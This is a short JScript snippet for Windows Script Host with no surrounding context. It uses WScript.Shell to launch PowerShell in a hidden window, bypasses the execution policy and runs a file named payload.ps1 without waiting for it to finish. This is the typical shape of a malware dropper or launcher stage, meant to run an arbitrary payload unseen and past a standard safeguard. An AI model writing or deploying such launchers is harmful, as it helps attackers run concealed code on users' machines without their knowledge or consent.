var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
shell.Run("powershell -NoProfile -ExecutionPolicy Bypass -File payload.ps1", 0, false);
